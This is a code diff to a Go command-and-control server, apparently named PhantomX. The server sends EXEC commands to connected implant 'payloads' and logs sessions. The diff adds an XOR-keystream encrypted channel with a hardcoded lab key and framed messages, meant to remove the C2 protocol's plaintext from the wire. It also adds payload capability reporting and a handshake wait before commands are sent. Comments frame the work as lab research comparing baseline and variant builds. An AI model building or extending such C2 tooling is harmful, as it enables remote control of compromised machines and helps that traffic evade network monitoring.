@@ -57,6 +57,7 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
+	"io"
 	"net"
 	"os"
 	"os/signal"
@@ -76,6 +77,18 @@ const (
 	pingTimeout = 10 * time.Second
 	readBufSize = 64 * 1024
 )
+
+// DefaultChannelKey is the built-in shared key for the encrypted-channel
+// variant.
+//
+// It MUST match PX_DEFAULT_XOR_KEY in px_config.h. The payload and the
+// server derive the same keystream from it, so a mismatch means the
+// server sees garbage and the session dies at the first frame.
+//
+// It is a lab default and it is not a secret. The point of the variant
+// is to remove the plaintext from the wire, not to keep the operator
+// out of their own capture.
+const DefaultChannelKey = "phantomx-lab-key-0123456789abcdef"
 
 // tsFormat matches the Python reference's datetime.isoformat() output so both
 // audit logs can be diffed line by line.
@@ -178,14 +191,22 @@ func dirOf(p string) string {
 
 // Session is one connected payload.
 type Session struct {
-	id       int
-	conn     net.Conn
-	addr     string
-	arch     string
-	pid      string
-	host     string
+	id        int
+	conn      net.Conn
+	addr      string
+	arch      string
+	pid       string
+	host      string
 	connected time.Time
-	lastSeen time.Time
+	lastSeen  time.Time
+
+	// The capability mask the payload reported, and the readable form of
+	// it. Without this the audit log cannot tell a baseline session from
+	// a variant session, and the comparison between them -- the whole
+	// point of the variant builds -- is impossible.
+	capabilities uint32
+	capSummary   string
+	capReported  bool
 
 	latencyMS  float64
 	hasLatency bool
@@ -201,6 +222,10 @@ type Session struct {
 	results  map[string]storedResult
 
 	sendMu sync.Mutex
+
+	// The two keystreams, present only for an encrypted-channel session.
+	ksOut *Keystream
+	ksIn  *Keystream
 }
 
 // storedResult is the decoded outcome of one EXEC, kept so that the console
@@ -233,10 +258,25 @@ func newSession(id int, conn net.Conn, addr string) *Session {
 	}
 }
 
+// send writes a protocol line to the payload.
+//
+// In a baseline session that is the line followed by CRLF, in the clear.
+// In an encrypted session the line is encrypted and framed, so that the
+// wire no longer carries the protocol in plaintext.
 func (s *Session) send(text string) bool {
 	s.sendMu.Lock()
 	defer s.sendMu.Unlock()
 	s.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+
+	if s.ksOut != nil {
+		frame := s.ksOut.EncryptFrame([]byte(text))
+		_, err := s.conn.Write(frame)
+		if err != nil {
+			s.alive = false
+			return false
+		}
+		return true
+	}
 	_, err := s.conn.Write([]byte(text + "\r\n"))
 	if err != nil {
 		s.alive = false
@@ -277,6 +317,10 @@ type Server struct {
 
 	statsMu sync.Mutex
 	stats   map[string]int
+
+	// The shared channel key, for the encrypted-channel variant.
+	// Empty means the compiled-in default is used.
+	channelKey []byte
 
 	running bool
 	runMu   sync.Mutex
@@ -501,29 +545,91 @@ func (s *Server) clientLoop(sess *Session) {
 	}()
 
 	reader := bufio.NewReaderSize(sess.conn, readBufSize)
-	var buf strings.Builder
 
 	for s.isRunning() && sess.alive {
 		sess.conn.SetReadDeadline(time.Now().Add(30 * time.Second))
-		chunk, err := reader.ReadString('\n')
-		if chunk != "" {
-			buf.WriteString(chunk)
-			for {
-				raw := buf.String()
-				idx := strings.IndexByte(raw, '\n')
-				if idx < 0 {
-					break
+
+		// The encrypted arm reads whole FRAMES.
+		//
+		// The frame boundary is not known in advance -- it is in the
+		// clear length prefix -- so the length is read first, then
+		// exactly that many bytes. A frame that does not arrive intact
+		// is discarded whole, which is what keeps the keystream in sync.
+		if sess.ksIn != nil {
+			hdr := make([]byte, FrameLengthPrefix)
+			if _, err := io.ReadFull(reader, hdr); err != nil {
+				break
+			}
+			n := int(hdr[0]) | (int(hdr[1]) << 8) |
+				(int(hdr[2]) << 16) | (int(hdr[3]) << 24)
+			if n <= 0 || n > maxFrameSize {
+				break
+			}
+			body := make([]byte, n)
+			if _, err := io.ReadFull(reader, body); err != nil {
+				break
+			}
+			frame := append(hdr, body...)
+			plain, _, err := sess.ksIn.DecryptFrame(frame)
+			if err != nil {
+				break
+			}
+			line := strings.TrimSpace(string(plain))
+			if line != "" {
+				s.handleLine(sess, line)
+			}
+			continue
+		}
+
+		// The plaintext phase reads exactly ONE line.
+		//
+		// ReadString('\n') reads whatever has arrived in one go, which
+		// is a problem: the last plaintext line before the channel is
+		// encrypted (the CAPS report) can arrive in the same TCP
+		// segment as the beginning of the first encrypted frame, and
+		// ReadString would swallow the frame's first bytes into its
+		// return value. The keystream would then be desynchronised
+		// before the first frame was ever decrypted.
+		//
+		// Reading one byte at a time until the newline is found stops
+		// exactly at the boundary, so nothing after it is consumed.
+		//
+		// The read error has to be carried out to the OUTER loop. An
+		// earlier version broke out of the inner loop only, so the
+		// outer loop immediately tried to read again, got the same
+		// error, and spun forever. The session never closed, and the
+		// audit log never got its "session_close" record -- which is
+		// exactly what the cross-implementation comparison reported as
+		// a difference between the two servers.
+		var lineBuf []byte
+		var readErr error
+		for {
+			b, err := reader.ReadByte()
+			if err != nil {
+				readErr = err
+				if len(lineBuf) > 0 {
+					s.handleLine(sess, strings.TrimSpace(string(lineBuf)))
 				}
-				line := strings.TrimSpace(raw[:idx])
-				buf.Reset()
-				buf.WriteString(raw[idx+1:])
-				if line != "" {
-					s.handleLine(sess, line)
-				}
+				break
+			}
+			if b == '\n' {
+				break
+			}
+			if len(lineBuf) < 64*1024 {
+				lineBuf = append(lineBuf, b)
 			}
 		}
-		if err != nil {
+		if readErr != nil {
+			// The peer closed the connection, or it died. Either way
+			// the session is over.
 			break
+		}
+		if len(lineBuf) == 0 {
+			continue
+		}
+		line := strings.TrimSpace(string(lineBuf))
+		if line != "" {
+			s.handleLine(sess, line)
 		}
 	}
 }
@@ -534,6 +640,37 @@ func (s *Server) handleLine(sess *Session, line string) {
 	kind := parts[0]
 
 	switch kind {
+	case "CAPS":
+		// The capability report. The payload says which variant build it
+		// is, and the server records it. This is what makes a baseline
+		// session distinguishable from a variant session in the audit
+		// log, which is the precondition for comparing them.
+		mask := ParseCapabilities(line)
+		sess.capabilities = mask
+		sess.capSummary = CapabilitySummary(mask)
+		sess.capReported = true
+
+		// An encrypted-channel session needs its keystreams before the
+		// first frame is exchanged, so they are set up here.
+		if mask&CapEncrypted != 0 {
+			key := s.channelKey
+			if len(key) == 0 {
+				key = []byte(DefaultChannelKey)
+			}
+			// The seeds are the mirror of the payload's: the payload
+			// encrypts outbound with seed 0x00 and decrypts inbound with
+			// seed 0x5A, so the server does the opposite.
+			sess.ksOut = NewKeystream(key, 0x5A)
+			sess.ksIn = NewKeystream(key, 0x00)
+		}
+
+		s.audit.write("capabilities", map[string]any{
+			"session": sess.id, "mask": fmt.Sprintf("0x%02x", mask),
+			"capabilities": sess.capSummary,
+		})
+		fmt.Printf("[*] session %d capabilities: %s\n", sess.id, sess.capSummary)
+		return
+
 	case "HELLO":
 		if len(parts) > 1 {
 			sess.arch = parts[1]
@@ -644,6 +781,12 @@ type execResult struct {
 }
 
 func (s *Server) exec(sess *Session, command string, timeout time.Duration) *execResult {
+	// Nothing may be sent before the handshake is complete. See
+	// waitForHandshake for why.
+	if !s.waitForHandshake(sess, timeout) {
+		return nil
+	}
+
 	s.sessionsMu.Lock()
 	s.cmdCounter++
 	cmdID := strconv.Itoa(s.cmdCounter)
@@ -719,6 +862,20 @@ func (s *Server) lastExit(sess *Session, cmdID string) string {
 }
 
 func (s *Server) measureLatency(sess *Session, timeout time.Duration) (float64, bool) {
+	// The handshake has to be complete before anything is sent.
+	//
+	// The payload sends HELLO and CAPS in the clear and only then switches
+	// to the encrypted channel. If the server sends anything BEFORE the
+	// CAPS line has been processed, the payload reads it as a frame when
+	// it expects one -- or reads it as plaintext when it expects a frame,
+	// depending on the timing -- and the session desynchronises.
+	//
+	// The failure was very hard to read: the session opened, exchanged
+	// the handshake, and then went silent, with no error on either side.
+	if !s.waitForHandshake(sess, timeout) {
+		return 0, false
+	}
+
 	s.sessionsMu.Lock()
 	s.cmdCounter++
 	cmdID := strconv.Itoa(s.cmdCounter)
@@ -741,6 +898,22 @@ func (s *Server) measureLatency(sess *Session, timeout time.Duration) (float64, 
 	sess.mu.Lock()
 	defer sess.mu.Unlock()
 	return sess.latencyMS, sess.hasLatency
+}
+
+// waitForHandshake blocks until the payload's CAPS report has been
+// processed.
+//
+// The CAPS report is what tells the server whether the session is
+// encrypted, so nothing may be sent before it has been read.
+func (s *Server) waitForHandshake(sess *Session, timeout time.Duration) bool {
+	deadline := time.Now().Add(timeout)
+	for time.Now().Before(deadline) {
+		if sess.capReported {
+			return true
+		}
+		time.Sleep(20 * time.Millisecond)
+	}
+	return sess.capReported
 }
 
 // ---------------------------------------------------------------------------
@@ -915,11 +1088,16 @@ func main() {
 	logpath := flag.String("log", "c2_audit.jsonl", "audit log path")
 	noConsole := flag.Bool("no-console", false, "run headless (for scripted / automated runs)")
 	duration := flag.Int("duration", 0, "stop automatically after N seconds (0 = run forever)")
+	key := flag.String("key", "", "shared channel key for the encrypted-channel variant (default: the built-in lab key)")
 	flag.Parse()
 
 	fmt.Print(banner)
 
 	srv := newServer(*host, *port, *logpath, !*noConsole, time.Duration(*duration)*time.Second)
+	if *key != "" {
+		srv.channelKey = []byte(*key)
+		fmt.Printf("[+] channel key set (encrypted-channel variant enabled)\n")
+	}
 
 	// Ctrl+C shuts the server down cleanly so the audit log is flushed and
 	// the payload gets an EXIT rather than a dropped socket.
